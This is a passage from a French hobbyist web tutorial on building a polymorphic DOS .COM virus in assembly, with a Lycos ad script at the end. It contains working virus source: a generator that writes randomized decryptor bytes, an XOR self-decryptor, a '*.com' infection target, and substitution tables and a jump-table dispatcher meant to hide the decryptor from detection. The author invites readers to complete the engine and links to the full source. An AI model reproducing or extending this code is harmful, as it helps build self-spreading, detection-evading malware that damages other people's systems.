+ instr_41:
+ mov byte ptr es:[si],0E8h</font>    ; call (decalage nul , pointe sur pop di)
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],00h</font>     ;    "   "
+ <font color="#ffff00">inc si                            
+ mov byte ptr es:[si],00h</font>     ;    "   "
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],5Fh</font>     ; le fameu POP DI (DI contient le registre IP)
+ <font color="#ffff00">jmp suite_05
+ instr_42:
+ mov byte ptr es:[si],0E8h</font>    ; call (decalage nul , pointe sur pop di)
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],00h</font>     ;    "   "
+ <font color="#ffff00">inc si                            
+ mov byte ptr es:[si],00h</font>     ;    "   "
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],5Fh</font>     ; le fameu POP DI (DI contient le registre IP)
+ <font color="#ffff00">jmp suite_05
+suite_05:
+ inc si
+
+ ;----------------------------------------------------------------------------
+ ;-                         ADD DI,04                                        -
+ ;----------------------------------------------------------------------------
+
+ call rand
+ cmp cl,1
+ je instr_51
+ cmp cl,2
+ je instr_52</font>
+ <font color="#ffff00">mov byte ptr es:[si],83h</font>     ; add di,04h
+ <font color="#ffff00">inc si                              
+ mov byte ptr es:[si],0C7h</font>    ;    "  "
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],04h</font>     ;    "  "
+ <font color="#ffff00">jmp suite_06
+ instr_51:
+ mov byte ptr es:[si],83h</font>     ; add di,04h
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],0C7h</font>    ;    "  "
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],04h</font>     ;    "  "
+ <font color="#ffff00">jmp suite_06
+ instr_52:
+ mov byte ptr es:[si],83h</font>     ; add di,04h
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],0C7h</font>    ;    "  "
+ <font color="#ffff00">inc si
+ mov byte ptr es:[si],04h</font>     ;    "  "
+<font color="#ffff00">suite_06:
+ inc si
+
+ ;----------------------------------------------------------------------------
+ ;-                              XOR [SI],AH                                 -
+ ;----------------------------------------------------------------------------
+
+ call rand
+ cmp cl,1
+ je instr_61
+ cmp cl,2
+ je instr_62
+ mov byte ptr es:[si],30h</font>     ; xor [si],ah
+<font color="#ffff00"> inc si
+ mov byte ptr es:[si],24h     
+ jmp suite_07
+ instr_61:
+ mov byte ptr es:[si],30h</font>     ; xor [si],ah
+<font color="#ffff00"> inc si
+ mov byte ptr es:[si],24h     
+ jmp suite_07
+ instr_62:
+ mov byte ptr es:[si],30h</font>     ; xor [si],ah
+<font color="#ffff00"> inc si
+ mov byte ptr es:[si],24h     
+suite_07:
+ inc si
+
+ ;----------------------------------------------------------------------------
+ ;-                             INC SI                                       -
+ ;----------------------------------------------------------------------------
+
+ call rand
+ cmp cl,1
+ je instr_71
+ cmp cl,2
+ je instr_72
+ mov byte ptr es:[si],46h</font>     ; inc si
+ <font color="#ffff00">jmp suite_08
+ instr_71:
+ mov byte ptr es:[si],83h</font>     ; add si,1
+<font color="#ffff00"> inc si
+ mov byte ptr es:[si],0C6h
+ inc si
+ mov byte ptr es:[si],01h
+ jmp suite_08
+ instr_72:
+ mov byte ptr es:[si],46h</font>     ; inc si
+<font color="#ffff00">suite_08:
+ inc si
+
+ ;----------------------------------------------------------------------------
+<a name="offset uncrypt"> ;-                        CMP SI, XX   (Ajuster si modif)                   -</a>
+ ;----------------------------------------------------------------------------
+
+ call rand
+ cmp cl,1
+ je instr_81
+ cmp cl,2
+ je instr_82
+ mov byte ptr es:[si],81h</font>     ; cmp si, xx
+<font color="#ffff00"> inc si
+ mov byte ptr es:[si],0FEh
+ inc si
+ mov byte ptr es:[si],22h
+ inc si
+ mov byte ptr es:[si],04h
+ jmp suite_09
+ instr_81:
+ mov byte ptr es:[si],0BBh</font>    ; mov bx, XX
+<font color="#ffff00"> inc si
+ mov byte ptr es:[si],02h
+ inc si
+ mov byte ptr es:[si],04h
+ inc si
+ mov byte ptr es:[si],83h</font>     ; xor bx, 20h
+<font color="#ffff00"> inc si
+ mov byte ptr es:[si],0f3h
+ inc si
+ mov byte ptr es:[si],20h
+ inc si
+ mov byte ptr es:[si],3bh</font>     ;cmp si,bx
+<font color="#ffff00"> inc si
+ mov byte ptr es:[si],0F3h
+ jmp suite_09
+ instr_82:
+ mov byte ptr es:[si],81h
+ inc si
+ mov byte ptr es:[si],0FEh
+ inc si
+ mov byte ptr es:[si],022h
+ inc si
+ mov byte ptr es:[si],04h
+suite_09:
+ inc si
+
+ ;----------------------------------------------------------------------------
+ ;-                        JE 195 (ip+2)                                     -
+ ;----------------------------------------------------------------------------
+
+ call rand
+ cmp cl,1
+ je instr_91
+ mov byte ptr es:[si],74h</font>     ; JE
+<font color="#ffff00"> inc si                    
+ mov byte ptr es:[si],02h     
+ jmp suite_0a
+ instr_91:
+ mov byte ptr es:[si],7Dh</font>     ; JGE
+<font color="#ffff00"> inc si
+ mov byte ptr es:[si],02h     
+suite_0a:
+ inc si
+
+ ;----------------------------------------------------------------------------
+ ;-                         JMP DI ;RET                                      -
+ ;----------------------------------------------------------------------------
+
+ mov byte ptr es:[si],0FFh</font>    ; JMP DI
+<font color="#ffff00"> inc si
+ mov byte ptr es:[si],0E7h    
+ inc si
+ mov byte ptr es:[si],0C3h</font>    ; RET
+<font color="#ffff00">suite_0B:
+
+ret</font>
+
+COM_FILE db '*.com',0        ;Place la chaîne de caractère '*.com'
+                             ;dans COM_FILE (COM_FILE="*.COM")
+ender:                       ;Label qui sert à déterminer la taille
+                             ;du virus.
+<font color="#02fdab">uncrypt:
+ mov cx,[ender - debut]  ; Taille du code crypté.  <b>( 1 )</b>
+ mov si,offset  debut    ; SI pointe vers 'debut:'
+ mov ah,byte ptr [si]    ; AH contient le byte pointé par SI
+ xor ah,90h              ; Récupère la clef en AH
+call decrypt
+ decrypt:
+  pop di
+  add di,4
+  xor byte ptr [si],ah   ; ici on decrypte avec la clef.
+  inc si                 ; Deplace le pointeur.
+  cmp si,offset [uncrypt]; Evidemment , on ne décrypte pas le décrypteur :o)  <b>( 2 )</b>
+  je sortir
+ jmp di
+sortir:
+ret</font>
+
+end start                    ;Fin du code.
+</font></font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"><font color="#00ffff"><br></font>
+<font color="#baa9d6"><u>Explications :</u></font><br>
+<br>
+Le décrypteur a été créé afin de pouvoir être modifié sans se soucier des adresses pointeur.<br>
+Seul la taille du corps du virus contenue dans CX <b><a href="#mov%20cx"><font color="#00ffff"><b>( 1 )</b></font></a></b>et l'offset de uncrypt <b><a href="#offset%20uncrypt"><font color="#00ffff"><b>( 2 )</b></font></a></b> sont à réajuster lorsque vous modifiez le corp du virus ou le système de polymorphise.<br>
+Attention ! ce système de polymorphisme est trivial afin d'être facile à comprendre.<br>
+(il n'y pas d'ajout d'instructions parasites ou de permutation).<br>
+Un moteur de polymorphisme complet doit <u>générer</u> des instructions aléatoires afin de diluer le décrypteur.<br>
+Je vous laisse donc le soin de modifier et de compléter ce code qui marche déja bien.<br>
+<font color="#a6caf0"><i>Ne prenez pas le code ci dessus pour argent content il doit etre complété pour être efficace.</i></font><br>
+<br>
+Code source : <a href="http://membres.lycos.fr/gatesbillou/virus/download/Mini-polymorphe.asm"><font color="#a6caf0">MINI-POLIMORPHE</font></a><br>    
+<br>
+<a name="fonctions identiques">Nous pouvons donc commencer à dresser une liste de fonctions identiques afin d'enrichir notre moteur de polymorphisme :</a>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"> <font color="#ffff00">*************************************
+ *<font color="#c0dcc0"> Instruction MOV Registre,valeur :</font> *
+ *************************************</font>
+
+<font color="#c0c0c0"><i>Ici , ce sera MOV AX,1234h</i></font>
+
+ MOV BX,1231h   ; AX=0000h  BX=<font color="#ffff00">1231</font>h  PILE=0000h
+ PUSH BX        ; AX=0000h  BX=1231h  PILE=<font color="#ffff00">1231</font>h
+ POP AX         ; AX=<font color="#ffff00">1231</font>h  BX=1231h  PILE=0000h
+ XOR AX,5       ; AX=<font color="#00ff00">1234</font>h  BX=1231h  PILE=0000h
+
+   ou
+
+ MOV AX,0FE05h  
+ JMP $-2        ; <a href="#trap_01"><font color="#ff80ff">Explication</font></a>
+ XOR AH,0F8h    
+ XOR AL,37h     
+
+    ou
+	
+ MOV AH,[CS:0]  ; A CS:0 il y a le PSP qui commence par CD 20
+ MOV AL,[CS:1]  ; AH = CDh  et AL=20h
+ SUB AH,0BBh    ; CDh - BBh = 12h
+ ADD AL,14H     ; 20h - 14h = 34h . Ici AX=<font color="#00ff00">1234</font>h
+ 
+    ou
+	
+ MOV AX,0012h   ; AX=00<font color="#ff0000">12</font>h  CL=0000h
+ MOV CL,8       ; AX=0012h  CL=<font color="#ffff00">0008</font>h
+ SHL AX,CL      ; AX=<font color="#00ff00">12</font>00h  CL=0008h
+ OR AX,34h      ; Masque 0034h
+ 
+ <font color="#ffff00">*************************************
+ *<font color="#c0dcc0"> Instruction XOR Registre,valeur :</font> *
+ *************************************</font>
+ 
+<a href="#XOR"><font color="#d8f40b">Cliquez ICI pour la table de véritée.</font></a>
+
+Ainsi , la fonction XOR peut s'écrire  : (A ou B) et [pas(A et B)].
+
+Nous pouvons écrire la fonction OU EXCLUSIF avec les fonctions logiques :
+
+                "ET" , "OU INCLUSIF" et "INVERSEUR".
+
+Par exemple , pour faire <font color="#ff0000">96h XOR 33h</font> (=<font color="#00ff00">A5</font>h) :
+
+ mov ax,9633h ; ah=96h  et  al=33h                    AX=<font color="#ff0000">9633</font>h  BX=0000h  PILE=0000h
+ push ax      ; copie 9633h dans la pile              AX=9633h  BX=0000h  PILE=<font color="#ffff00">9633</font>h
+ or ah,al     ; <font color="#c0c0c0">OU INCLUSIF</font> entre ah et al            AX=<font color="#ffff00">B7</font>33h  BX=0000h  PILE=9633h
+ mov bh,ah    ; met le resultat du 96h OU 33h dans bh AX=B733h  BX=<font color="#ffff00">B7</font>00h  PILE=9633h
+ pop ax       ; restaure ax (donc ah et al)           AX=<font color="#ffff00">9633</font>h  BX=B700h  PILE=<font color="#ffff00">0000</font>h
+ and ah,al    ; <font color="#c0c0c0">ET</font> entre 96h et 33h                   AX=<font color="#ffff00">12</font>33h  BX=B700h  PILE=0000h         
+ not ah       ; <font color="#c0c0c0">INVERSION</font> des bits de ah (12h -&gt; EDh) AX=<font color="#ffff00">ED</font>33h  BX=B700h  PILE=0000h      
+ and ah,bh    ; <font color="#c0c0c0">ET</font> entre EDh et B7h                   AX=<font color="#00ff00">A5</font>33h  BX=B700h  PILE=0000h
+
+</font></font></font></font></b></font></pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"><font color="#00ff00">Voila , AH contient le résultat de 96 XOR 33 , c'est à dire A5h.</font></font></font></font></font></b></font><pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"> <font color="#ffff00">*************************************
+ *<font color="#c0dcc0"> Instruction JMP Adresse :</font>         *
+ *************************************</font>
+ 
+cs:0100 BF0301      mov di,0103             mov di,offset debut
+cs:0103 3024        xor [si],ah   <font color="#c0c0c0">debut :</font>   xor byte ptr [si],ah
+cs:0105 46          inc si                  inc si
+cs:0106 81FE2D04    cmp si,042D             cmp si,offset [uncrypt] ; sur 'decypt' ?
+cs:010A 7402        je 010E                 je sortir               ; OUI -&gt; sortir
+cs:010C 57          push di                 <font color="#a6caf0">push di</font>                 ; met DI dans la pile ....
+cs:010D C3          ret                     <font color="#a6caf0">ret</font>                     ; Retourne à l'adresse DI 
+cs:010E 90          nop           <font color="#c0c0c0">sortir :</font>  nop
+
+</font></font></font></font></b></font></pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">On
+sait que l'adresse de retour d'un CALL est stoqué dans la pile , alors
+on met soit même l'adresse de retour dans la pile et on fait un RET
+comme si on voulait revenir à l'adresse d'appel. (On simule un CALL a
+l'adresse désirée)</font></font></font></font></b></font><pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"> <font color="#ffff00">*************************************
+ *<font color="#c0dcc0"> Instruction PUSH valeur :</font>         *
+ *************************************</font>
+
+Par exemple , pour faire un <font color="#ff0000">PUSH AX</font> (AX=<font color="#ff0000">1234</font>h) :
+
+ mov ax,1234h      ; AX=<font color="#ff0000">1234</font>h  BP=0000h  SP=FFFEh  SS:SP=0000h
+ sub sp,2          ; AX=1234h  BP=0000h  SP=<font color="#ffff00">FFFC</font>h  SS:SP=????h
+ mov bp,sp         ; AX=1234h  BP=<font color="#ffff00">FFFC</font>h  SP=FFFCh  SS:SP=????h
+ mov [ss:bp],ax    ; AX=1234h  BP=FFFCh  SP=FFFCh  SS:SP=<font color="#00ff00">1234</font>h
+
+ <font color="#ffff00">*************************************
+ *<font color="#c0dcc0"> Instruction ADD Reg,valeur :</font>      *
+ *************************************</font>
+
+Ainsi , la fonction ADD peut s'écrire  : (A ET B) + (A OU B).
+
+Nous pouvons écrire la fonction ADD avec les fonctions logiques :
+
+                "ET" et "OU INCLUSIF".
+
+Par exemple , pour faire <font color="#ff0000">ADD AX</font>,<font color="#ff0000">BX</font> (AX=<font color="#ff8080">1234</font>h BX=<font color="#ff8080">4321</font>h AX+BX=<font color="#00ff00">5555</font>h) :
+
+ mov ax,1234h ;  AX=<font color="#ff0000">1234</font>h  BX=0000h  PILE=0000h
+ mov bx,4321h ;  AX=1234h  BX=<font color="#ff0000">4321</font>h  PILE=0000h
+ and ax,bx    ;  AX=<font color="#ffff00">0220</font>h  BX=4321h  PILE=0000h
+ push ax      ;  AX=0220h  BX=4321h  PILE=<font color="#ffff00">0220</font>h
+ mov ax,1234h ;  AX=<font color="#ffff00">1234</font>h  BX=4321h  PILE=0220h
+ or ax,bx     ;  AX=<font color="#ffff00">5335</font>h  BX=4321h  PILE=0220h
+ pop bx       ;  AX=5335h  BX=<font color="#ffff00">0220</font>h  PILE=<font color="#ffff00">0000</font>h
+ add ax,bx    ;  AX=<font color="#00ff00">5555</font>h  BX=0220h  PILE=0000h  
+
+ <font color="#ffff00">*************************************
+ *<font color="#c0dcc0"> Instruction RET :</font>                 *
+ *************************************</font>
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">L'instruction RET peut être remplacée par un POP et un JMP.<br>
+La fonction RET saute à l'adresse contenue dans la pile (elle dépile l'adresse et y saute).<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"> pop bx       ; Met l'adresse de retour dans BX
+ jmp bx       ; Saute à l'adresse BX
+
+<font color="#ff0000"><u>Générateur de nombres 'pseudo aléatoires' :</u></font> 
+</font></font></font></font></b></font></pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Nous avons utilisé un générateur de nombre 'pseudo aléatoire' simpliste afin de tracer et de comprendre le code facilement.<br>
+Nous allons maintenant créer un générateur unpeu plus 'PRO'.<br>
+<br>
+Quand on prend le timer (<a href="#timer"><font color="#a6caf0">l'horloge</font></a>) dans un registre 8 bits on a 256 possibilitées (0 à 255).<br>
+Maintenant , si on veut un générateur de nombre qui nous sort des chiffres compris entre 0 et 5 ....<br>
+<br>
+La solution est simple comme un MODULO !<br>
+<br>
+
+<img src="virus_com_data/congruences.jpg" border="0" height="178" width="334">
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">    
+Pour ceux qui ne sont pas très philosophe voila ce qu'on peut dire :
+
+   <font color="#ff0000">2436</font> ¦ <font color="#ff00ff">22</font>      Division du Dividende 2436 par le Diviseur 22
+   22   +----
+   --   ¦ <font color="#c0c0c0">110</font>     Ca donne le Quotient 110
+   023  ¦
+    22  ¦
+    --  ¦
+     <font color="#00ff00">16</font> ¦         Et le reste 16
+
+Pour faire 2436 il faut mettre 110 fois 22 et rajouter 16.
+Les mathématiciens diront que 2436 est CONGRU à 16 (modulo 22).
+
+<font color="#00ff00">16</font> = <font color="#ff0000">2436</font> mod <font color="#ff00ff">22</font>
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Grace au modulo nous pouvons choisir la plage dans laquelle on veut un nombre en partant d'un nombre pouvant aller jusqu'à 255.<br>
+Dans l'exemple cité juste avant ( 2436 mod 22 ) le résultat sera compris entre 0 et 22 (ici ce sera <font color="#00ff00">16</font>)<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Voyons ce que ca donne en assembleur :
+
+ mov ax,<font color="#ff0000">2436</font> ; 2436 en décimal &lt;==&gt;  0984 en hexadécimal      AX=<font color="#ffff00">0984</font> BX=0000 DX=0000
+ mov bx,<font color="#ff00ff">0022</font> ; 0022 en décimal &lt;==&gt;  0016 en hexadécimal      AX=0984 BX=<font color="#ffff00">0016</font> DX=0000
+ div bx      ; <font color="#c0c0c0">0110</font> en décimal &lt;==&gt;  006E en hexadécimal (AH) AX=<font color="#ffff00">006E</font> BX=0016 DX=<font color="#ffff00">0010</font>
+             ; <font color="#00ff00">0016</font> en décimal &lt;==&gt;  0010 en hexadécimal (DX)
+
+Si mon explication n'est pas claire allez voir ce site : <a href="http://villemin.gerard.free.fr/ThNbDemo/Modulo.htm"><font color="#cc99ff">Modulo</font></a> ; il y a des exemples.<br>
+De plus sur <a href="http://villemin.gerard.free.fr/Crypto/RSA.htm"><font color="#9e82cc">ce site</font></a> il y à des explications sur l'utilisation du Modulo dans le cryptage RSA.
+			 
+<font color="#a6caf0"><u>Résumons :</u></font>
+
+<i><u>A ce stade , nous avons :</u></i>
+
+ - Un virus polymorphe
+ - Une petite liste de fonctions equivalentes afin de compléter le moteur de polymorphisme
+ - Un 'pseudo genérateur de nombres aléatoires paramétrable'.
+ 
+</font></font></font></font></b></font></pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Si on s'arrête ici nous aurons un petit virus sympathique , mais pas de quoi casser trois pattes à un canard.</font></font></font></font></b></font><pre></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Commencons par améliorer la partie "création d'un nouveau décrypteur" :<br>
+<br>
+La structure actuelle de choix pour la nouvelle instruction est la suivante :<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"> call rand    ; On prend un nombre aléatoire
+ cmp cl,1     ; Si 1 alors aller à instruction x1 
+ je instr_x1
+ cmp cl,2     ; Si 2 alors aller à instruction x2
+ je instr_x2
+ cmp cl,3     ; Si 3 alors aller à instruction x3
+
+ETC ...
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">D'accord , si on a 3 ou 4 fonctions équivalentes à notre disposition , mais si on table sur une dizaine , ca devient lourd.<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Alors il faut utiliser cette structure :
+
+; entrée : al = nombre aléatoire compris entre 0 et ??
+;          cl = nombres de possibilitées + 1 (fouchette entre 0 et CL)
+    
+;------------- Modulo -------------
+ mov cl,5     ; 6 possibilitees (0 / 1 / 2 /3 / 4 / 5)
+ div cl       ; division - modulo
+ xchg ah,al   ; on veut le resultat dans al
+ xor ah,ah    ; ah = 0     
+;------- Pointeur d'adresse -------
+ mov cx,2            ; Adresse codée sur 2 octets
+ mul cx
+ mov bx,ax           ; Copie ax dans bx 
+ add bx,offset liste ; Ajoute à BX l'offset de 'liste'
+ call word ptr [bx]  ; Saute à BX
+;----------- Procédures -----------
+......
+instr_01:
+ bla bla
+ret
+
+instr_02:
+ bla bla
+ret
+
+etc ...
+;--------- Fin du programme -------
+ mov ax,4c00h       ; le code executable s'arret ici !
+ int 21h
+
+; Maintenant on déclare les procédures qu'on va utiliser. 
+
+liste dw offset instr0
+      dw offset instr1
+      dw offset instr2
+      dw offset instr3
+      dw offset instr4
+
+
+On Résume :
+
+On déclare nos procédures (instr_01,instr_02...).
+Après le CALL RAND on met :
+
+ mov cx,2            ; Adresse codée sur 2 octets
+ mul cx
+ mov bx,ax           ; Copie ax dans bx 
+ add bx,offset liste ; Ajoute à BX l'offset de 'liste'
+ call word ptr [bx]  ; Saute à BX
+
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Et voila , nous pouvons ajouter autant de fonction equivalentes qu'on veut sans alourdir le code innutilement.
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Regardons sous Turbo Debugger :
+
+<img src="virus_com_data/choix.jpg" border="0" height="580" width="640">
+
+En CS:0111 on fait un call à l'adresse contenue dans CS:0134 + 2*AL.
+
+Si AL=0 alors BX=134 -&gt; on fait un call vers l'adresse contenue dans CS:0134 =&gt; Call CS:0120
+Si AL=1 alors BX=136 -&gt; on fait un call vers l'adresse contenue dans CS:0136 =&gt; Call CS:0124
+Si AL=2 alors BX=138 -&gt; on fait un call vers l'adresse contenue dans CS:0138 =&gt; Call CS:0128
+Si AL=3 alors BX=13A -&gt; on fait un call vers l'adresse contenue dans CS:013A =&gt; Call CS:012C
+Si AL=4 alors BX=13C -&gt; on fait un call vers l'adresse contenue dans CS:013C =&gt; Call CS:0130
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Je rappel par exemple qu'à l'adresse CS:0134 il y à <font color="#ff8000">2001</font> , ceci est l'adresse CS:<font color="#ff8000">0120</font> du tableau 'LISTE' qui pointe sur CS:13E où il y à la première phrase : 'Cette fois c'est 0'.<br> 
+A partie de l'adresse CS:013E il y à les différentes phrases qu'il peut afficher.<br>
+<br>
+<br>
+Un petit exemple très simple pour mieux comprendre : <a href="http://membres.lycos.fr/gatesbillou/virus/download/choix.zip"><font color="#a6caf0">CHOIX.ASM</font></a> (Tracez avec TD)<br>
+<u><font color="#ff0000">Instructions 'parasites' :</font><br></u>
+<br>
+N'oublions pas que nous devons rajouter des <a href="#inst_inutile"><font color="#00ffff">instructions 'diluantes'</font></a> :<br>
+</font></font></font></font></b></font><pre><font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">start:      
+ mov <font color="#cc99cc">cx</font>,[ender - debut]  
+ mov <font color="#99ccff">si</font>,offset  debut    
+ mov <font color="#99ffcc">ah</font>,byte ptr [<font color="#99ccff">si</font>]      
+ xor <font color="#99ffcc">ah</font>,90h
+ decrypt:
+   xor byte ptr [<font color="#99ccff">si</font>],<font color="#99ffcc">ah</font> 
+   inc <font color="#99ccff">si</font>
+loop decrypt             
+debut:
+  nop
+  ...
+</font></font></font></font></b></font></pre>
+<font color="#ffffff" size="3"><b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff">Le décrypteur de base n'utilise que trois registres : CX , SI et AH.<br>
+Si on examine la liste de nos '<a href="#fonctions%20identiques"><font color="#c0c0c0">fonctions identiques</font></a>' on s'appercoit bien qu'on a pris soin de coller au maximum à la fonction de base.<br>
+Par example , un MOV AX,1234h pourra s'écrite autrement , l'important c'est qu'en sortie AX valle 1234h (c'est évident).
+<br>
+ 
+<br>
+<br>A suivre ...<br>
+<br>
+<b><a href="http://membres.lycos.fr/gatesbillou/virus/virus_exe.html"><font color="#ffcccc">SUITE</font></a></b>
+<br>
+Mon adresse : gatesbillou@hotmail.com   n'hésitez pas :o)  (Mais avant regardez la <a href="http://membres.lycos.fr/gatesbillou/virus/FAQ.html"><font color="#ffccff">FAQ</font></a>)<br>
+</font></font></font></font></b><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"><font color="#ffffff"></font>
+
+   
+<noscript>
+<a href="http://www.xiti.com/xiti.asp?s=130788" TARGET="_top"><img
+width="39" height="25" border=0
+src="http://logv23.xiti.com/hit.xiti?s=130788&p=&" title="Mesurez votre
+audience"></a>
+</noscript><!--//-->
+</font></font></font></font><div style="position: absolute; visibility: hidden; left: -5000px; top: -5000px;"><font color="#ffffff" size="3"><font color="#ff00ff"><font color="#00ffff"><font color="#00ffff"> 
+<textarea>&lt;/pre&gt;&lt;/xmp&gt;&lt;/noscript&gt;&lt;script
+language="javascript"
+src="http://ads.multimania.lycos.fr/ad/test_frame_size.js"&gt;&lt;/script&gt;
+&lt;script language="javascript"&gt;
+if (!AD_clientWindowSize()) { document.write("&lt;NOSC"+"RIPT&gt;");
+}
+&lt;/script&gt;
+&lt;script type="text/javascript"&gt; function setCookie(name, value,
+expires, path, domain, secure) { var curCookie = name + "=" +
+escape(value) + ((expires) ? "; expires=" + expires.toGMTString() : "")
++ ((path) ? "; path=" + path : "") + ((domain) ? "; domain=" + domain :
+"") + ((secure) ? "; secure" : ""); document.cookie = curCookie; } var
+ad_url =
+"http://ads.multimania.lycos.fr/ad/google/frame.php?_url="+escape(self.location)+"&amp;gg_bg=&amp;gg_template=&amp;mkw=virus+polymorphe+tasm&amp;cat=noref";
+var ref=window.document.referrer; if(parent.LycosAdFrame) {
+if(parent.memberPage &amp;&amp; parent.memberPage.document.title ) {
+parent.document.title=parent.memberPage.document.title; }
+if(parent.LycosAdFrame &amp;&amp; parent.LycosAdFrame.location
+&amp;&amp; (ref != "" &amp;&amp; (ref+"?" != window.location)
+&amp;&amp; (ref.substr(ref.length-1,1) != "/")) ) {
+parent.LycosAdFrame.location.replace(ad_url); }
+setCookie("adFrameForcePHP",0,0," "); parent.document.body.cols =
+"*,140"; } else if(top.LycosAdFrame &amp;&amp;
+top.LycosAdFrame.location) { if ((ref != "" &amp;&amp; (ref+"?" !=
+top.window.location) &amp;&amp; (ref.substr(ref.length-1,1) != "?"))) {
+top.LycosAdFrame.location.replace(ad_url); }
+setCookie("adFrameForcePHP",0,0," "); top.document.body.cols = "*,140";
+} else { if (!window.opener) { setCookie("adFrameForcePHP",1,0," "); }
+else { setCookie("adFrameForcePHP",0,0," "); } } if
+(window.top.location.href.indexOf("http://membres.lycos.fr")!=-1) {
+ad_frame = 1 ; window.top.document.body.cols="*,140" ; }
+function resizeGoogleAdFrame() { window.top.document.body.cols =
+"*,140";
+} if (ad_frame == 1 &amp;&amp; AD_clientWindowSize()) {
+setInterval("resizeGoogleAdFrame()", 30); } &lt;/script&gt;
+&lt;script language="javascript"
+src="http://ads.multimania.lycos.fr/ad/popunder_lycos_update.php?cat=noref&amp;CC=fr"&gt;&lt;/script&gt;
+&lt;script type="text/javascript"
+src="http://ads.multimania.lycos.fr/ad/ad.php?cat=noref&amp;mkw=virus+polymorphe+tasm&amp;CC=fr&amp;ord=56ec0fba&amp;adpref="&gt;&lt;/script&gt;
+&lt;!-- START RedSheriff Measurement V5.01 --&gt;
+&lt;!-- COPYRIGHT 2002 RedSheriff Limited --&gt;
+&lt;script language="JavaScript" type="text/javascript"&gt;&lt;!-- var
+_rsCI='lycos-fr'; var _rsCG='noref'; var _rsDT=1; var
+_rsSI=escape(window.location); var
+_rsLP=location.protocol.indexOf('https')&gt;-1?'https:':'http:'; var
+_rsRP=escape(document.referrer); var
+_rsND=_rsLP+'//secure-uk.imrworldwide.com/'; if
+(parseInt(navigator.appVersion)&gt;=4) { var _rsRD=(new
+Date()).getTime(); var _rsSE=0; var _rsSV=''; var _rsSM=0;
+_rsCL='&lt;scr'+'ipt language="JavaScript" type="text/javascript"
+src="'+_rsND+'v5.js"&gt;&lt;\/scr'+'ipt&gt;'; } else { _rsCL='&lt;img
+src="'+_rsND+'cgi-bin/m?ci='+_rsCI+'&amp;cg='+_rsCG+'&amp;si='+_rsSI+'&amp;rp='+_rsRP+'"&gt;';
+} document.write(_rsCL);
+//--&gt;&lt;/script&gt;
+&lt;noscript&gt;
+&lt;img
+src="//secure-uk.imrworldwide.com/cgi-bin/m?ci=lycos-fr&amp;amp;cg=noref"
+alt=""&gt;
+&lt;/noscript&gt;
+&lt;!-- END RedSheriff Measurement V5 --&gt;</textarea></font></font></font></font></div></body></html>
